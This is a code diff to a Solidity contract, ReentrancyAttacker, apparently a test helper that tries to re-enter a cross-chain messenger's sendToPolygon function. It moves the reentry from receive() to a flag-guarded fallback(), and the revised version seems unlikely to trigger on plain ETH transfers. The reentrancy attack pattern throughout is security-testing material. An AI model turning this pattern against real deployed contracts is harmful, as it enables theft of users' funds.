@@ -10,6 +10,7 @@ contract ReentrancyAttacker {
     uint256 public attackCount;
     uint256 public constant ATTACK_VALUE = 1 ether;
     bool public initialized;
+    bool public attacking;
 
     constructor(address payable _messenger, address _router) {
         messenger = CrossChainMessenger(_messenger);
@@ -17,20 +18,21 @@ contract ReentrancyAttacker {
         initialized = true;
     }
 
-    receive() external payable {
-        require(initialized, "Contract not initialized");
-        if (attackCount < 2 && address(this).balance >= ATTACK_VALUE) {
-            attackCount++;
-            // Attempt direct reentry into sendToPolygon
+    // Fallback function to handle ETH transfers
+    fallback() external payable {
+        if (attacking && initialized && address(this).balance >= ATTACK_VALUE) {
+            attacking = false; // Prevent recursive fallback calls
             messenger.sendToPolygon{value: ATTACK_VALUE}(address(this));
         }
     }
 
+    // Receive function required for ETH transfers
+    receive() external payable {}
+
     function attack() external payable {
         require(initialized, "Contract not initialized");
         require(msg.value >= ATTACK_VALUE, "Need at least 1 ETH");
-        attackCount = 0;
-        // Initial call to trigger the attack
+        attacking = true;
         messenger.sendToPolygon{value: ATTACK_VALUE}(address(this));
     }
 }
